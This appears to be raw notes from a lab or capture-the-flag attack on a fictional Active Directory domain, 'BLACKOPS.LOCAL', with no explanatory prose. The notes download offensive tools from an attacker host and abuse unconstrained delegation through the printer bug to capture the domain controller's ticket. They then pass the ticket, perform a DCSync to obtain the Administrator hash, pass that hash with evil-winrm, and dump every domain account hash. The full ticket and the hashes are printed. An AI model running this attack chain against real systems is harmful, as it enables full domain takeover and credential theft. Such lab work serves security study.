Allows Unconstrained Delegation True

iwr http://192.168.0.7/Rubeus.exe -o Rubeus.exe
iwr http://192.168.0.7/MS-RPRN.exe -o MS-RPRN.exe
iwr http://192.168.0.7/PsExec64.exe -o PsExec64.exe

.\PsExec64.exe -s -i powershell

.\Rubeus.exe monitor /interval:10 /nowrap

.\MS-RPRN.exe \\dc.BLACKOPS.LOCAL \\srv02.BLACKOPS.LOCAL

[*] 11/17/2023 3:44:35 PM UTC - Found new TGT:

  User                  :  DC$@BLACKOPS.LOCAL
  StartTime             :  11/17/2023 10:42:07 AM
  EndTime               :  11/17/2023 8:42:07 PM
  RenewTill             :  11/24/2023 10:42:07 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFDDCCBQigAwIBBaEDAgEWooIEEDCCBAxhggQIMIIEBKADAgEFoRAbDkJMQUNLT1BTLkxPQ0FMoiMwIaADAgECoRowGBsGa3JidGd0Gw5CTEFDS09QUy5MT0NBTKOCA8QwggPAoAMCARKhAwIBAqKCA7IEggOuToV1POaE64b3PUhgeQi4DMMxSKA5lj8xmplF8qqCahHS+8QBk3PSlpAwoQkX38PYNfVYuXiKEkLjVcpVBEf/Oz9Ge37+gmJJm+FmO0y15boidd0OV5XRf4Xeazt5vhjYe9rqPQ8BN0FOrmaVh81RjgiqAy80lBKRub4tc3QFxUWES8LI/2HvcWHmfQN3wat+3Q+UIsJ45gVCs9/lnTgeoKzM2l48kRa45nmog9if22a1aZZP6i4kfRd175lODNaUEqtwtwnD1jrFJKFsnXOR41TQFtjdVA2GlMpHo5FhfLNee75tRMcWMcrsuvN9uGZMFcGPJXjLZRJp/nWLpKJ6TdJW+WXJ2cbXuef5Jxm3yX72a14/FzyufCKsGImtZbJAg2Y0Jy6Fbn1d4+KfaEvxATi6Op7/62gq8yqEcHHP0/9yTvmEl95gwOYJH/ft2t0YPRvq7V9TZn0JEVlxixjpJoanlJC1DWmPRXrq2FIXl2Qo584VLN06TBkigFzw2AnEBBuzTUExUQCK6kS+iKIcAz+F8678+SnpeO3DtDyP4Op0K0Jc2iA0mjKC9tGjHF5939Hkyp6NYlZPIc6RpHP7W6+cZkagoZ1g2AnyXSlBy182ua6/Z0JthW08+AE9qM4/rj7Ex2sYAwvJe402rSdTgYlu50RsKOr5/d3KCbqJF5IBc8EEgVRm1GpjqdV7fX52Vek7IwqoIFKCoRYwSPtJu6inKIarjz6so2BGpQ2sSMdHhUuEd2pYcWPb4BvjreuEo1q4KQ0J45LC9frfbp63rN22MN4f+0J3Gt2SHcvgmPdJoTEEUS3EUTmaGnlvm4vBsDUBRgcIUrN+pswOdfHQBTeZ92bHCNBYSaVwsviuCfy4AwpqeLawATDZPn/ndvPprPOAk969+ZKj79LnE5i95H0Y9P+VwNLwkic8saykyO/WFLMaaMP3tuDYzmfQKj2/beheSMA7qWTjpSBq25VNOQkWS5QAfVMsXecZzp1ttvxJldCMMbpfe3NLusp/30IPJii9XHH5uftHf7WciqvocRYf7I5zJEFfDO/NFAAgK/4SM5m0rnRMqdGVZSLZA6FUe6Vs6GuLa5XnjeOvK1daxSf8l1nOYY9nFH3pKcd1xORDWjUSAlxmq3WFDcPtw65RJp0oDStG8Y3cz4XMK0bFNVdnFU9MbaMa52hpxztqpB2e3KXxgnNC1zs323eksD1i65fpggub92+QFKXbaQy9GbmsWj550YKlc4b0dqI3o4HnMIHkoAMCAQCigdwEgdl9gdYwgdOggdAwgc0wgcqgKzApoAMCARKhIgQg9FDSrz95QDaFsmoo9R17eNFBpI8hif8K5w3h1tAjQUChEBsOQkxBQ0tPUFMuTE9DQUyiEDAOoAMCAQGhBzAFGwNEQySjBwMFAGChAAClERgPMjAyMzExMTcxNTQyMDdaphEYDzIwMjMxMTE4MDE0MjA3WqcRGA8yMDIzMTEyNDE1NDIwN1qoEBsOQkxBQ0tPUFMuTE9DQUypIzAhoAMCAQKhGjAYGwZrcmJ0Z3QbDkJMQUNLT1BTLkxPQ0FM


.\Rubeus.exe ptt /ticket:doIFDDCCBQigAwIBBaEDAgEWooIEEDCCBAxhggQIMIIEBKADAgEFoRAbDkJMQUNLT1BTLkxPQ0FMoiMwIaADAgECoRowGBsGa3JidGd0Gw5CTEFDS09QUy5MT0NBTKOCA8QwggPAoAMCARKhAwIBAqKCA7IEggOuToV1POaE64b3PUhgeQi4DMMxSKA5lj8xmplF8qqCahHS+8QBk3PSlpAwoQkX38PYNfVYuXiKEkLjVcpVBEf/Oz9Ge37+gmJJm+FmO0y15boidd0OV5XRf4Xeazt5vhjYe9rqPQ8BN0FOrmaVh81RjgiqAy80lBKRub4tc3QFxUWES8LI/2HvcWHmfQN3wat+3Q+UIsJ45gVCs9/lnTgeoKzM2l48kRa45nmog9if22a1aZZP6i4kfRd175lODNaUEqtwtwnD1jrFJKFsnXOR41TQFtjdVA2GlMpHo5FhfLNee75tRMcWMcrsuvN9uGZMFcGPJXjLZRJp/nWLpKJ6TdJW+WXJ2cbXuef5Jxm3yX72a14/FzyufCKsGImtZbJAg2Y0Jy6Fbn1d4+KfaEvxATi6Op7/62gq8yqEcHHP0/9yTvmEl95gwOYJH/ft2t0YPRvq7V9TZn0JEVlxixjpJoanlJC1DWmPRXrq2FIXl2Qo584VLN06TBkigFzw2AnEBBuzTUExUQCK6kS+iKIcAz+F8678+SnpeO3DtDyP4Op0K0Jc2iA0mjKC9tGjHF5939Hkyp6NYlZPIc6RpHP7W6+cZkagoZ1g2AnyXSlBy182ua6/Z0JthW08+AE9qM4/rj7Ex2sYAwvJe402rSdTgYlu50RsKOr5/d3KCbqJF5IBc8EEgVRm1GpjqdV7fX52Vek7IwqoIFKCoRYwSPtJu6inKIarjz6so2BGpQ2sSMdHhUuEd2pYcWPb4BvjreuEo1q4KQ0J45LC9frfbp63rN22MN4f+0J3Gt2SHcvgmPdJoTEEUS3EUTmaGnlvm4vBsDUBRgcIUrN+pswOdfHQBTeZ92bHCNBYSaVwsviuCfy4AwpqeLawATDZPn/ndvPprPOAk969+ZKj79LnE5i95H0Y9P+VwNLwkic8saykyO/WFLMaaMP3tuDYzmfQKj2/beheSMA7qWTjpSBq25VNOQkWS5QAfVMsXecZzp1ttvxJldCMMbpfe3NLusp/30IPJii9XHH5uftHf7WciqvocRYf7I5zJEFfDO/NFAAgK/4SM5m0rnRMqdGVZSLZA6FUe6Vs6GuLa5XnjeOvK1daxSf8l1nOYY9nFH3pKcd1xORDWjUSAlxmq3WFDcPtw65RJp0oDStG8Y3cz4XMK0bFNVdnFU9MbaMa52hpxztqpB2e3KXxgnNC1zs323eksD1i65fpggub92+QFKXbaQy9GbmsWj550YKlc4b0dqI3o4HnMIHkoAMCAQCigdwEgdl9gdYwgdOggdAwgc0wgcqgKzApoAMCARKhIgQg9FDSrz95QDaFsmoo9R17eNFBpI8hif8K5w3h1tAjQUChEBsOQkxBQ0tPUFMuTE9DQUyiEDAOoAMCAQGhBzAFGwNEQySjBwMFAGChAAClERgPMjAyMzExMTcxNTQyMDdaphEYDzIwMjMxMTE4MDE0MjA3WqcRGA8yMDIzMTEyNDE1NDIwN1qoEBsOQkxBQ0tPUFMuTE9DQUypIzAhoAMCAQKhGjAYGwZrcmJ0Z3QbDkJMQUNLT1BTLkxPQ0FM


iwr http://192.168.0.7/SafetyKatz.exe -o SafetyKatz.exe
.\SafetyKatz.exe "lsadump::dcsync /domain:blackops.local /user:blackops\administrator" "exit"


Hash NTLM: d15fdea760f725c19d15c595230fe937


evil-winrm -i 192.168.0.56 -u blackops\\administrator -H d15fdea760f725c19d15c595230fe937
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackops\administrator


PS C:\Windows\Tasks> .\SafetyKatz.exe "lsadump::dcsync /domain:blackops.local /all /csv" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:blackops.local /all /csv
[DC] 'blackops.local' will be the domain
[DC] 'dc.blackops.local' will be the DC server
[DC] Exporting domain 'blackops.local'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  bf1393e99e79c37c4f68fb2223d9cd39        514
1125    svc_sq1 64f12cddaa88057e06a81b54e73b949b        4260352
1000    DC$     fec96da675cd4b4c2f4b9848923313b2        532480
500     Administrator   d15fdea760f725c19d15c595230fe937        1114624
1122    FILE01$ eb5835470917d77f9356df1a6c8cff4c        69632
1116    helen.park      5c3536eb8a3cba820c9b4f0aea3d12bc        66048
1103    SRV02$  ab60830933a04151a282c2e27c77cfc0        528384
1120    CLIENT01$       324f21a13d05dfb76c22c91e054e1450        4096
1121    WEB01$  9099d68602a60f007c227c4fa95fada6        69632
1110    svc_sql c905217230dc16016f90de922b2856f0        66048
1112    jason.hudson    65e39d9b0bebd2d26820e3889645f18d        66048
1107    alex.mason      c43be5868bf33fbe0d4b05921c54237a        66048
1115    russell.adler   d2fccde3264938b8c4157993317da72a        66048
1119    frank.woods     a87f3a337d73085c45f9416be5787d86        66048
1113    ir_operator     ebf5ec4bb7acebd0e360ce99c3472d27        66048
1109    df_operator     ebf5ec4bb7acebd0e360ce99c3472d27        66048
1104    SRV01$  075b0a54921bdc3323db91bfabe948bf        4096
3102    rbcd$   3dbde697d71690a769204beb12283678        4096
```